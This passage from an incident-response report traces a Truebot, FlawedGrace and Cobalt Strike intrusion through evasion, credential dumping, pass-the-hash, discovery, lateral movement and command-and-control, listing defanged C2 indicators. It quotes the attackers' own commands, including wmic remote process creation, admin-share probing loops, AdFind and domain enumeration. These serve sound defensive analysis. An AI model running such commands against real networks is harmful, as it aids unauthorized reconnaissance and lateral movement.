<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18974" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-018.png" alt width="1161" height="683" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-018.png 1161w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-018-300x176.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-018-1024x602.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-018-768x452.png 768w" sizes="(max-width: 1161px) 100vw, 1161px" /></a></figure>


<p>The effect of deleting the RequiredPrivileges registry entry can be observed in the following screenshots where the post-modification spoolsv.exe process is seen with a flurry of additional permissions, all of which the threat actors may enjoy post-injection.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18975" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-019.png" alt width="619" height="538" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-019.png 619w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-019-300x261.png 300w" sizes="(max-width: 619px) 100vw, 619px" /></a> <a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18976" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-020.png" alt width="619" height="911" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-020.png 619w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-020-204x300.png 204w" sizes="(max-width: 619px) 100vw, 619px" /></a></figure>



<p>Scheduled tasks were used by the threat actors to run much of their malware as SYSTEM. The initial execution tasks for FlawedGrace used the \2 registered task were created to run under SYSTEM as seen by the Author in the task details.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18979" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-021.png" alt width="655" height="550" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-021.png 655w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-021-300x252.png 300w" sizes="(max-width: 655px) 100vw, 655px" /></a></figure>


<p>This could then be seen with the user NT AUTHORITY\SYSTEM running the task command and arguments in process creation logs.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18980" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-022.png" alt width="800" height="570" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-022.png 800w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-022-300x214.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-022-768x547.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></a></figure>
<p>&nbsp;</p>


<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>


<p>Shortly after execution, the Truebot malware copied the initial malware to a new location renaming itself to RuntimeBroker.exe, masquerading as an executable responsible for managing certain application permissions.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18981" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-023.png" alt width="803" height="229" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-023.png 803w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-023-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-023-768x219.png 768w" sizes="(max-width: 803px) 100vw, 803px" /></a></figure>


<p>As covered in the execution section, FlawedGrace uses a number of techniques to perform evasion, including encoding, encryption, and storing payloads in the registry. When executing, command-line data was encoded. See the <a href="#execution">Execution section</a> for a breakdown of the encoding.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18982" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-024.png" alt width="794" height="547" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-024.png 794w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-024-300x207.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-024-768x529.png 768w" sizes="(max-width: 794px) 100vw, 794px" /></a></figure>


<p>During runtime, the FlawedGrace malware decrypts the RC4 encrypted registry stored payload:</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18983" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-025.png" alt width="975" height="187" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-025.png 975w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-025-300x58.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-025-768x147.png 768w" sizes="(max-width: 975px) 100vw, 975px" /></a></figure>


<p>We observed process injection by all three malware families in this intrusion. First, Truebot used it to inject the Cobalt Strike payload into a cmd.exe process.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18984" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-026.png" alt width="542" height="274" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-026.png 542w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-026-300x152.png 300w" sizes="(max-width: 542px) 100vw, 542px" /></a></figure>


<p>Reviewing memory dumps, the injected MZ header for the Cobalt Strike beacon is easily observable in the injected cmd.exe process.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18985" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-027.png" alt width="1064" height="383" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-027.png 1064w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-027-300x108.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-027-1024x369.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-027-768x276.png 768w" sizes="(max-width: 1064px) 100vw, 1064px" /></a></figure>


<p>Cobalt Strike was not the only injection with observable headers, each svchost.exe and msiexec.exe also contained telltale injection signs like PAGE_EXECUTE_READWRITE protection and MZ file headers.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18986" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-028.png" alt width="1004" height="814" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-028.png 1004w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-028-300x243.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-028-768x623.png 768w" sizes="(max-width: 1004px) 100vw, 1004px" /></a></figure>



<p>Standard Cobalt Strike named pipes using the postex_* patterns were observed throughout the intrusion.</p>


<pre class="wp-block-preformatted">\postex_0c2a
\postex_e3dc
\postex_7c32
\postex_8e03
\postex_f3cc
\postex_56b2
\postex_8c98
\postex_6ab5
\postex_7e1e
\postex_982c
\postex_a34b
\postex_7007
\postex_9e6a
\postex_ec79
\postex_5ef6
\postex_a195
\postex_10a9
\postex_511b
\postex_ffda
\postex_464b
\postex_dbf3
\postex_eb5d
\postex_1276
\postex_181d
\postex_8c48
</pre>



<p>Some Registry Items were removed during the FlawedGrace PowerShell execution, specifically the items stored in HKLM:\SOFTWARE\2\:</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18987" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-029.png" alt width="1482" height="234" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-029.png 1482w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-029-300x47.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-029-1024x162.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-029-768x121.png 768w" sizes="(max-width: 1482px) 100vw, 1482px" /></a></figure>


<p>File removal was observed with AdFind.exe being removed by the threat actors as well as Cobalt Strike beacon removal, after being used for lateral movement.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18988" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-030.png" alt width="792" height="491" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-030.png 792w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-030-300x186.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-030-768x476.png 768w" sizes="(max-width: 792px) 100vw, 792px" /></a></figure>
<p>&nbsp;</p>


<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<div class="ql-block" data-block-id="block-ff67866b-5f9a-43b8-bc2b-9b407bd39b21">Approximately one hour after the initial infection, we observed the threat actors using a remote dumping tool to extract credentials via the registry hives. At this time, we cannot confidently name the tool that they used. The logs of the credential access activity resemble those of <a class="ql-link" href="https://github.com/fortra/impacket/blob/efc6a1c365d5e0317ebe6a432448c861616859a7/impacket/examples/secretsdump.py" target="_blank" rel="noopener noreferrer">secretsdump</a>, which is a tool that is part of the Impacket library.</div>
<div data-block-id="block-ff67866b-5f9a-43b8-bc2b-9b407bd39b21"> </div>
<div class="ql-block" data-block-id="block-83877e6e-27fd-4b7b-8628-72153a20c16f">We noticed the creation of two temporary files in the C:\Windows\System32\ directory. The names of these files consisted of eight randomly generated characters. Prior to that, a service called &#8220;RemoteRegistry&#8221; was instructed to start. The Remote Registry allows administrators to access, modify, and manage the registry settings of other computers on a network. Once again, an example of this approach can be seen through secretsdump (<a class="ql-link" href="https://github.com/fortra/impacket/blob/efc6a1c365d5e0317ebe6a432448c861616859a7/impacket/examples/secretsdump.py#L374" target="_blank" rel="noopener noreferrer">secretsdump.py#L374</a>).</div>
<div data-block-id="block-83877e6e-27fd-4b7b-8628-72153a20c16f"> </div>


<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump.png"><img loading="lazy" decoding="async" class="alignnone wp-image-19053 size-full" src="https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump.png" alt width="2383" height="395" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump.png 2383w, https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump-300x50.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump-1024x170.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump-768x127.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump-1536x255.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/secretsdump-2048x339.png 2048w" sizes="(max-width: 2383px) 100vw, 2383px" /></a></p>
<p>We believe that the threat actors utilized an older version of the impacket Library. This is because as of May 4th, 2023, <a href="https://github.com/fortra/impacket/commit/551fb32988fa41df1f6a896841af327e4e1a58a3">version 0.10.0 modified</a> the location where the registry hives would extract. They are now saved as temp files under C:\Windows\Temp directory. However, as with this case, we observed the temp files under C:\Windows\System32, which indicates the use of an older version of impacket.</p>
<p>After reviewing the Security event logs for event ID 4624 and the Sysmon event logs (event ID 1 &amp; 10) on the beachhead host, we have determined that the attackers utilized Pass-The-Hash to run commands on remote hosts as the local administrator user.</p>


<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>Security Logs</strong></td>
<td><strong>Sysmon Logs</strong></td>
</tr>
<tr>
<td>4624 &#8211; LogonType: 9LogonProcess: seclogo</td>
<td>1 &#8211; Cobalt Strike Execution</td>
</tr>
<tr>
<td> </td>
<td>10 &#8211; Cobalt Strike Accessing LSASS Process</td>
</tr>
</tbody>
</table>
</figure>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18989" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-031.png" alt width="2418" height="404" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-031.png 2418w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-031-300x50.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-031-1024x171.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-031-768x128.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-031-1536x257.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-031-2048x342.png 2048w" sizes="(max-width: 2418px) 100vw, 2418px" /></a></figure>


<p>When considering this evidence, the time sequence is a crucial factor. To prevent false positives, defenders can group related events together based on their time of execution. However, we have also included specific Sigma rules that are capable of identifying these execution patterns in isolation. Please refer to these rules in the <a href="#detections">Detections section</a> of this report.</p>


<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>


<p>We also observed the threat actors utilizing for loops to iterate through text files located in the C:\ProgramData directory. These files contained the hostname of all workstations and servers within the network environment. The aim of this loop was to execute discovery commands using ping to locate live endpoints and net view to enumerate their open shares. In addition, they used the dir command to test the feasibility of connecting to remote servers within the network through the local administrator&#8217;s account.</p>


<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers_live.txt) do net view \\%i /all &gt;&gt; C:\ProgramData\servers_live_netview.txt

C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do dir \\%%i\C$ &gt;&gt; C:\ProgramData\servers_live_dir.txt

C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | find /I "TTL" &gt;&gt; C:\ProgramData\hosts_live.txt

C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | find /I "TTL" &gt;&gt; C:\ProgramData\servers_live.txt
</pre>


<p>In addition to using net view to find open shares, the attackers also examined the registry of the local host and saved a list of all mapped shares in a text file called 1.txt. We also observed them using the wmic command to execute the same action on a remote host.</p>


<pre class="wp-block-preformatted">cmd /C &gt; C:\ProgramData\1.txt 2&gt;&amp;1 reg query HKEY_USERS\\&lt;SID&gt;\Network

C:\Windows\system32\cmd.exe /C wmic /node:&lt;REDACTED&gt; process call create "cmd /C &gt; C:\ProgramData\1.txt 2&gt;&amp;1 reg query HKEY_USERS\&lt;SID&gt;\Network"
</pre>


<p>They later viewed and deleted the text file using the type and del commands respectively.</p>


<p>To check the status of the antimalware software that is installed, they used PowerShell along with the <a href="https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps" target="_blank" rel="noreferrer noopener">Get-MpComputerStatus</a> cmdlet. This command was run on multiple hosts in the environment. We believe the execution of this command came through <a href="https://github.com/fortra/impacket/blob/8b3f9eff06b3a14c09e8e64cfc762cf2adeed013/examples/atexec.py#LL122C29-L122C47" target="_blank" rel="noreferrer noopener">atexec.py</a>, which is part of the impacket collection.</p>


<pre>cmd.exe /C powershell Get-MpComputerStatus &gt; C:\Windows\Temp\KMzFGwGn.tmp 2&gt;&amp;1</pre>


<p>AdFind was used in this intrusion, however, the threat actors limited the output only to collect operating system information and specific attributes from the domain user objects.</p>


<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C AdFind.exe -f "&amp;(objectcategory=computer)" operatingSystem -csv &gt; 1.csv

C:\Windows\system32\cmd.exe /C AdFind.exe -f "objectcategory=person" sAMAccountName name displayName givenName department description title mail logonCount -csv &gt; person.csv 
</pre>


<p>We also observed some other miscellaneous commands that we tend to see in every intrusion. These discovery commands collected information about the administrator groups and users. Although, there was one notable use of the tasklist command where threat actors used the /S parameter to retrieve the list of currently running processes from remote hosts.</p>


<pre class="wp-block-preformatted">quser
net  group "Domain Admins" /domain
net  group "Domain Controllers" /domain 
net  group /domain
net  localgroup "Remote Desktop Users"
net  localgroup Administrators
net  user &lt;user&gt; /domain
nltest  /domain_trusts
tasklist /S &lt;IP of remote host&gt;</pre>


<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>


<p>The threat actors predominately used Cobalt Strike&#8217;s jump psexec module to move to new hosts. The event ID 7045 (A new service was installed in the system) in System.evtx showed clear evidence of the malicious service being installed.</p>


<p>The DFIR Report&#8217;s <a href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/#:~:text=using%20POST%20requests.%E2%80%9D-,Lateral%20Movement,-Once%20Cobalt%20Strike" target="_blank" rel="noreferrer noopener">defender&#8217;s guide to Cobalt Strike</a> discusses this in further detail.</p>


<p>As seen below, when filtered to these events, we observed the threat actor moving to a new system every 5-20 minutes.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18990" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-032.png" alt width="776" height="232" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-032.png 776w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-032-300x90.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-032-768x230.png 768w" sizes="(max-width: 776px) 100vw, 776px" /></a></figure>


<p>As we mentioned in the discovery phase, threat actors also used atexec to execute commands on remote hosts. Impacket&#8217;s atexec module allows the remote execution of commands on a Windows system by leveraging the Task Scheduler service. The module registers a task on a remote system that would execute the instructed command. The task would then be deleted upon successful execution. The example below is from the Security event logs, event ID 4698.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18991" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-033.png" alt width="3434" height="1476" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-033.png 3434w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-033-300x129.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-033-1024x440.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-033-768x330.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-033-1536x660.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-033-2048x880.png 2048w" sizes="(max-width: 3434px) 100vw, 3434px" /></a></figure>


<p>To showcase the hardcoded lines of code responsible for the observed execution flow, we have included a snippet from atexec&#8217;s official GitHub page in the screenshot above. Threat actors used Cobalt Strike to facilitate the execution of this module.</p>


<p>In some other cases, we saw threat actors executing the below command from the beachhead host toward a number of remote hosts.</p>


<pre>cmd.exe /C wmic /node:&lt;remote host&gt; process get executablepath</pre>


<p>This command uses Windows Management Instrumentation CommandLine (WMIC) to remotely retrieve the executable paths of all running processes from a number of remote hosts.</p>


<ol>
<li>/node:&lt;remote host&gt;: specifies the remote host.</li>


<li>process: represents the WMI class to be queried; in this case, it&#8217;s related to running processes on the target system.</li>


<li>get executablepath: is to retrieve the property &#8216;ExecutablePath&#8217;, which contains the complete path to the executable for each running process.</li>
</ol>


<p>We&#8217;ve created a chart displaying the times (UTC) when threat actors were active in the network. The data is based on a sample of affected hosts, but the pattern of activity remained consistent throughout the intrusion.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18992" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-034.png" alt width="1050" height="865" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-034.png 1050w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-034-300x247.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-034-1024x844.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-034-768x633.png 768w" sizes="(max-width: 1050px) 100vw, 1050px" /></a></figure>
<p>&nbsp;</p>


<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>


<p>Throughout the intrusion, the attackers staged results from their discovery within either the temporary directory or C:\ProgramData. As a reminder, the following discovery commands redirected their results to C:\ProgramData\hosts_live.txt and C:\ProgramData\servers_live.txt.</p>


<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | find /I "TTL" &gt;&gt; C:\ProgramData\hosts_live.txt

C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | find /I "TTL" &gt;&gt; C:\ProgramData\servers_live.txt
</pre>


<p>Additionally, populated and collected files included:</p>
<pre>C:\ProgramData\1.txt<br/>C:\Windows\Temp\KMzFGwGn.tmp<br/>C:\ProgramData\1.csv<br/>C:\ProgramData\person.csv<br/>C:\ProgramData\servers_live_dir.txt</pre>



<p>The extensive creation of text files (.txt and .csv) within the C:\ProgramData directory provides detection and hunting opportunities as legitimate software commonly leverages sub-folders of this directory.</p>


<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>


<h3 class="wp-block-heading">Truebot</h3>


<p>Communication to the Truebot C2 server at 45.182.189[.]71 began shortly after the execution of the initial access executable. This connection, however, only lasted for around two hours on the beachhead host, and activity ceased after the Cobalt Strike beacon payload was loaded on the host.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18993" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-035.png" alt width="2513" height="556" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-035.png 2513w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-035-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-035-1024x227.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-035-768x170.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-035-1536x340.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-035-2048x453.png 2048w" sizes="(max-width: 2513px) 100vw, 2513px" /></a></figure>


<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Domain</td>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>essadonio[.]com</td>
<td>45.182.189[.]71</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>f14f2862ee2df5d0f63a88b60c8eee56</td>
</tr>
<tr>
<td>essadonio[.]com</td>
<td>45.182.189[.]71</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>f33734dfbbff29f68bcde052e523c287</td>
</tr>
</tbody>
</table>
</figure>


<pre class="wp-block-preformatted">Certificate: [39:d7:cf:9d:0a:39:f6:b6:e4:cc:af:2e:34:9e:07:48:48:be:d1:ea]
Not Before: 2023/05/18 00:00:00 UTC 
Not After: 2023/08/16 23:59:59 UTC 
Issuer Org: ZeroSSL 
Subject Common: essadonio.com [essadonio.com ,www.essadonio.com]
Public Algorithm: id-ecPublicKey
Curve prime: 256v1
JARM: 28d28d28d00028d00042d42d0000005a3e96c1dfa4bdb24b8b3c04cae18cc3
</pre>


<p>Looking at memory collected from the beachhead host, we can observe the connection to the Truebot command and control server made by Runtimebroker.exe, the renamed executable copied from the initial malware payload.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18995" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-045.png" alt width="1084" height="78" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-045.png 1084w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-045-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-045-1024x74.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-045-768x55.png 768w" sizes="(max-width: 1084px) 100vw, 1084px" /></a></figure>


<h3 class="wp-block-heading">Flawed Grace</h3>


<p>The FlawedGrace malware is unlike any command and control we&#8217;ve covered in previous reports as it uses a <a href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" target="_blank" rel="noreferrer noopener">custom binary protocol</a> as opposed to the more common usage of application layer protocols like HTTP/s, RDP, or SSH.</p>


<p>Over the course of the intrusion, the threat actors pivoted to several command and control addresses with times of overlap between several C2 addresses. This activity took place several times over the course of the intrusion.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18994" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-036.png" alt width="2484" height="567" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-036.png 2484w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-036-300x68.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-036-1024x234.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-036-768x175.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-036-1536x351.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-036-2048x467.png 2048w" sizes="(max-width: 2484px) 100vw, 2484px" /></a></figure>


<p>As well as pivoting between command and control servers, the threat actors started communication from various hosts over the course of the intrusion with no host maintaining constant beaconing.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19070" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1.png" alt width="2297" height="572" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1.png 2297w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1-300x75.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1-1024x255.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1-768x191.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1-1536x382.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-037-1-2048x510.png 2048w" sizes="(max-width: 2297px) 100vw, 2297px" /></a></figure>


<p>As this malware uses a custom protocol, normal indicators like SSL certificate or JA3 were not present.</p>


<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
</tr>
<tr>
<td>81.19.135[.]30</td>
<td>443</td>
</tr>
<tr>
<td>92.118.36[.]199</td>
<td>443</td>
</tr>
<tr>
<td>5.188.86[.]18</td>
<td>443</td>
</tr>
</tbody>
</table>
</figure>


<p>Traces of command and control activity were present in memory on several hosts from the beachhead to multiple servers. Most no longer showed the responsible process, but at least one host had an active connection from an injected svchost.exe process to FlawedGrace command and control visible.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18997" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-038.png" alt width="1149" height="161" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-038.png 1149w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-038-300x42.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-038-1024x143.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-038-768x108.png 768w" sizes="(max-width: 1149px) 100vw, 1149px" /></a></figure>


<p>During the first day of the intrusion, we observed a network signature hit for RDP tunneling from one of the FlawedGrace command and control servers, but due to no follow-up activity, it would appear that this did not function properly for the threat actors.</p>


<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Signature</td>
<td>Source IP</td>
</tr>
<tr>
<td>ET POLICY Tunneled RDP msts Handshake</td>
<td>92.118.36[.]199</td>
</tr>
</tbody>
</table>
</figure>


<p>This likely also explains the removal of the local user account that had been added to the Remote Desktop Users group.</p>


<h3 class="wp-block-heading">Cobalt Strike</h3>


<p>Cobalt Strike, unlike the other two malware families observed, remained in constant communication with its command and control server after the first beacon was loaded until the end of the intrusion.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18998" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-039.png" alt width="2498" height="564" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-039.png 2498w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-039-300x68.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-039-1024x231.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-039-768x173.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-039-1536x347.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-039-2048x462.png 2048w" sizes="(max-width: 2498px) 100vw, 2498px" /></a></figure>


<p>While the Cobalt Strike command and control stayed active over the intrusion the threat actors did selectively deploy and remove it on hosts with only the beachhead host maintaining beaconing activity for the whole duration.</p>


